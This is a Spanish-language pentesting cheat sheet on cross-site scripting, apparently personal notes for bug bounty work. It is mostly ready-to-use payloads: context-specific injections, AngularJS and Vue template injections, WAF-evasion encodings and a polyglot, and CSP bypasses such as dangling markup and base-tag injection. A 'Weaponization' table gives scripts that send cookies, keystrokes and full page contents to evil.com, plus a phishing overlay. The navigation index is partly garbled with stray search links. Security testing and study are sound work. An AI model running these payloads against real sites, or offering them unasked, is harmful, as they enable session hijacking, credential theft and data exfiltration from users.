
---
Tags: #cybersecurity #pentesting #bugbounty #web-security #owasp-top10 #xss #cross-site-scripting #dom-based #stored-xss #reflected-xss #blind-xss #javascript #payloads #waf-bypass #csp-bypass #angularjs #vuejs #react #jquery #obfuscation #polyglots #weaponization #red-teaming #sink-source #browser-security

---

## 📑 Índice de Navegación

 [[#1. Anatomía de la Vulnerabilidad Contexto es Rey]]
	 
 [[#2. Matriz de Inyección por Contexto (Cheat Sheet)]]
    [[#A. Contexto HTML Body (Entre etiquetas)]]
	[[#B. Contexto Atributos (Dentro de etiquetas)]]
	[[#C. Contexto JavaScript (Dentro de Script)]]
	[[#D. Contexto URL / Redirección]]
	
 [[#3. Explotación DOM Avanzada Sinks y Sources]]
	[[#Sinks de Ejecución Directa (Code Execution)]]
	[[#Sinks de HTML (Markup Injection)]]
	[[#Técnicas de DOM Tricky (Casos Raros)]]
		[[#1. Inyección dentro de `<select>` (Tu Lab)]]
		[[#2. jQuery Selector Injection]]
		
 [[#4. Framework Injection (CSTI & Modern Web)]]
    [[#AngularJS (Versiones Antiguas & Sandbox)]]
	[[#Vue.js]]
	[[#React]]
	
 [[#5. Evasión de Filtros y WAF (Bypasses)]]
	[[#A. Codificación (Encoding Hell)]]
	[[#B. Sin Alfanuméricos (JSFuck / Non-Alpha)]]
	[[#C. Espacios y Separadores]]
	[[#D. Polyglots (La llave maestra)]]
	
[[#6. Bypass de Controles de Seguridad (CSP)]]
	[[#1. Dangling Markup (Robo sin Script)]]
	[[#2. Script Gadgets]]
	[[#3. Base Tag Injection]]
	
[[#7. Weaponization (Impacto Real)]]
	
[[#8. Herramientas y Automatización]]
	
[[#Referencias]]
4. [Evasión de Filtros y WAF (Bypasses)](https://www.google.com/search?q=%235-evasi%C3%B3n-de-filtros-y-waf-bypasses)
    
5. [Bypass de Controles de Seguridad (CSP)](https://www.google.com/search?q=%236-bypass-de-controles-de-seguridad-csp)
    
6. [Weaponization (Impacto Real)](https://www.google.com/search?q=%237-weaponization-impacto-real)
    
7. [Herramientas y Automatización](https://www.google.com/search?q=%238-herramientas-y-automatizaci%C3%B3n)
    [[]]

---

## 1. Anatomía de la Vulnerabilidad: Contexto es Rey

### Definición

**[[XSS - Cross-Site Scripting]]** es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en páginas web vistas por otros usuarios. Se explota al reflejar o almacenar contenido no validado que luego se interpreta como código en el navegador de la víctima.

🧠 **Objetivo**: ejecutar código en el navegador de la víctima para robar cookies, secuestrar sesiones, redirigir a sitios maliciosos o hacer keylogging.


El error novato es lanzar `<script>alert(1)</script>` a todo. El maestro analiza dónde aterriza el dato.

- **Source (Fuente):** Punto de entrada no confiable (`url`, `cookies`, `storage`, `api response`).
    
- **Context (Contexto):** Estado del intérprete cuando lee tu dato (HTML, Atributo, JS, CSS).
    
- **Sink (Sumidero):** Función que materializa la ejecución (`innerHTML`, `eval`, `sink`).
    

---

## 2. Matriz de Inyección por Contexto (Cheat Sheet)

### A. Contexto HTML Body (Entre etiquetas)

El input aterriza aquí: `<div> INPUT </div>`

|**Técnica**|**Payload / Código**|**Descripción**|
|---|---|---|
|**Script Tag**|`<script>alert(1)</script>`|Bloqueado por el 99% de WAFs.|
|**Image Vector**|`<img src=x onerror=alert(1)>`|Estándar. Funciona porque la src 'x' falla.|
|**SVG Vector**|`<svg/onload=alert(1)>`|XML-based. Permite espacios raros para bypass.|
|**Body/Iframe**|`<iframe src="javascript:alert(1)">`|Ejecución en contexto hijo.|
|**Details Toggle**|`<details open ontoggle=alert(1)>`|**User Interaction Free.** Se ejecuta al renderizar.|
|**Input Focus**|`<input onfocus=alert(1) autofocus>`|Se ejecuta instantáneamente al cargar.|

### B. Contexto Atributos (Dentro de etiquetas)

El input aterriza aquí: `<tag atributo="INPUT">`

|**Sub-Contexto**|**Payload**|**Explicación Técnica**|
|---|---|---|
|**Salir del Atributo**|`"><script>alert(1)</script>`|Cierras comillas, cierras tag, abres nuevo tag.|
|**Nuevo Evento**|`" onmouseover="alert(1)`|Inyectas un handler de eventos.|
|**Atributo `href` / `src`**|`javascript:alert(1)`|Protocol handler. No requiere comillas ni tags.|
|**Atributo `style`**|`expression(alert(1))`|_Solo IE antiguo_, pero útil en sistemas legacy.|
|**Canonical Link**|`'accesskey='x'onclick='alert(1)`|Para `<link rel="canonical"...>`. Requiere `Alt+X`.|

### C. Contexto JavaScript (Dentro de Script)

El input aterriza aquí: `<script> var x = 'INPUT'; </script>`

|**Situación**|**Técnica de Escape**|**Payload Completo**|
|---|---|---|
|**String Simple**|Romper cadena|`'; alert(1); //`|
|**Escapado (`\'`)**|Escapar la barra|`\'; alert(1); //` (Browser ve `\\'`)|
|**Dentro de Bloque**|Cerrar Script|`</script><script>alert(1)</script>`|
|**Template Literal**|Interpolación|`${alert(1)}` (En backticks `` ` ``)|
|**JSON Injection**|Polyglot JSON|`"}}'; alert(1); //`|

### D. Contexto URL / Redirección

El input aterriza en un header `Location` o un `window.location`.

- **Data URI:** `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
    
- **Javascript Scheme:** `javascript:alert(document.domain)`
    
- **VBScript Scheme:** `vbscript:msgbox(1)` (Solo IE antiguo).
    

---

## 3. Explotación DOM Avanzada: Sinks y Sources

DOM XSS ocurre completamente en el cliente. El servidor puede enviar una página segura, pero el JS del cliente la vuelve insegura.

### Sinks de Ejecución Directa (Code Execution)

Estos aceptan texto y lo convierten en código JS.

- `eval(payload)`
    
- `setTimeout(payload, 100)`
    
- `setInterval(payload, 100)`
    
- `new Function(payload)`
    

### Sinks de HTML (Markup Injection)

Estos parsean HTML. **OJO:** `innerHTML` no ejecuta `<script>` insertados dinámicamente (medida de seguridad de HTML5).

- `element.innerHTML` -> Usa `<img onerror>` o `<svg onload>`.
    
- `element.outerHTML`
    
- `document.write()` -> **Sí** ejecuta `<script>`.
    
- `document.writeln()`
    

### Técnicas de DOM Tricky (Casos Raros)

#### 1. Inyección dentro de `<select>` (Tu Lab)

El parser de HTML es estricto dentro de un `select`. No puedes poner un `img` dentro de `option`.

- **Mala Sintaxis:** `<select><option><img...></option></select>` (No funciona).
    
- **Bypass:** Debes cerrar el select primero.
    
- **Payload:** `</option></select><img src=x onerror=alert(1)>`
    

#### 2. jQuery Selector Injection

Si la app usa `$('location.hash')` o similar.

- **Vuln:** jQuery intenta seleccionar el elemento, pero si le das HTML, lo crea.
    
- **Payload:** `https://vuln.com/#<img src=x onerror=alert(1)>`
    

---

## 4. Framework Injection (CSTI & Modern Web)

Cuando inyectas en Vue, React o Angular, no inyectas HTML, inyectas **Plantillas**.

### AngularJS (Versiones Antiguas & Sandbox)

Angular evalúa lo que hay entre `{{ }}`.

- **Basic (1.x sin sandbox):** `{{constructor.constructor('alert(1)')()}}`
    
- **Bypass de Sandbox (1.5.x):** Sobreescribir prototipos.
    
    JavaScript
    
    ```
    {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
    ```
    
- CSP Bypass: Usar eventos propios de ng.
    
    ```js
	<input ng-focus="$event.view.alert(1)" autofocus>
    ```
    
    

### Vue.js

- **Payload:** `{{_v._s('alert(1)')}}` (Depende de la versión).
    
- **Attribute Injection:** `<div v-html="'<img src=x onerror=alert(1)>'"></div>`
    

### React

React escapa todo por defecto. El XSS ocurre si usan atributos peligrosos:

- `dangerouslySetInnerHTML={{__html: 'INPUT'}}`
    
- Inyección en `href` (acepta `javascript:`).
    

---

## 5. Evasión de Filtros y WAF (Bypasses)

Tu payload básico falla. ¿Cómo lo ofuscas?

### A. Codificación (Encoding Hell)

El navegador decodifica en capas (URL -> HTML -> JS).

1. **HTML Decimal:** `<a href="javascript&#58;alert(1)">`
    
2. **Hexadecimal:** `<a href="javascript&#x3a;alert(1)">`
    
3. **Unicode Escape (JS):** `\u0061lert(1)`
    
4. **Octal Escape:** `\141lert(1)`
    

### B. Sin Alfanuméricos (JSFuck / Non-Alpha)

Ejecutar código sin letras ni números.

- `(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]`... (Esto escribe "a", "b", etc).
    
- Herramienta: JSFuck.
    

### C. Espacios y Separadores

Los WAFs buscan `<img src`.

- `<img/src=x/onerror=alert(1)>` (Usar barras).
    
- `<svg/onload=alert(1)>`
    
- `<iframe/src="javascript:alert(1)">`
    

### D. Polyglots (La llave maestra)

Strings diseñados para romper múltiples contextos a la vez. Cópialos y úsalos como primer test.

> **El Polyglot de 0xSobky:**
> 
> JavaScript
> 
> ```
> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
> ```

---

## 6. Bypass de Controles de Seguridad (CSP)

**Content Security Policy (CSP)** impide cargar scripts externos o ejecutar inline.

### 1. Dangling Markup (Robo sin Script)

Si no puedes ejecutar JS, roba datos cargando recursos incompletos.

- **Payload:** `<img src='https://evil.com/log?key=`
    
- **Efecto:** El navegador sigue leyendo el HTML de la página (incluyendo tokens CSRF) hasta encontrar otra comilla `'`, y lo envía todo a tu servidor.
    

### 2. Script Gadgets

Usar librerías legítimas ya cargadas (Bootstrap, jQuery, Angular) para ejecutar código.

- Si la página permite `unsafe-eval` o `unsafe-inline` en ciertos contextos, usa las funciones de esas librerías para triggerear el XSS.
    

### 3. Base Tag Injection

Si bloquean scripts pero puedes inyectar `<base href="https://mi-servidor-malvado.com">`.

- Todos los scripts relativos (`<script src="js/app.js">`) se cargarán desde TU servidor.
    

---

## 7. Weaponization (Impacto Real)

Un `alert(1)` es una PoC. Un reporte crítico demuestra impacto.

|**Objetivo**|**Payload JS (Lo que alojas en tu .js externo)**|
|---|---|
|**Robo de Sesión**|`location='http://evil.com/?c='+document.cookie;`|
|**Keylogger**|`document.onkeypress=function(e){fetch('http://evil.com?k='+e.key)}`|
|**Phishing Overlay**|`document.body.innerHTML='<h1>Loguéate de nuevo</h1><form action=//evil.com>...'`|
|**Port Scanning**|Usar WebSockets o `fetch` para escanear `192.168.1.X` desde el navegador de la víctima (Intranet hacking).|
|**Exfiltración DOM**|`fetch('//evil.com', {method:'POST', body:document.documentElement.outerHTML})`|

---

## 8. Herramientas y Automatización

Para encontrar XSS masivamente.

- **Para buscar parámetros ocultos:** `ParamSpider`, `Arjun`.
    
- **Scanners DAST:** `XSStrike` (Muy bueno para bypass de WAF), `Dalfox` (El estándar actual en Go).
    
- **Burp Extensions:**
    
    - _DOM Invader:_ (Integrado en el navegador de Burp, brutal para DOM XSS).
        
    - _Reflector:_ Te avisa si un parámetro se refleja.
        
- **Grep manual (Source Code Review):**
    
    Bash
    
    ```
    grep -r "innerHTML" .
    grep -r "document.write" .
    grep -r "bypassSecurityTrustHtml" . # Angular
    grep -r "dangerouslySetInnerHTML" . # React
    ```
    

---

# Referencias

- [CheatSheet de PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)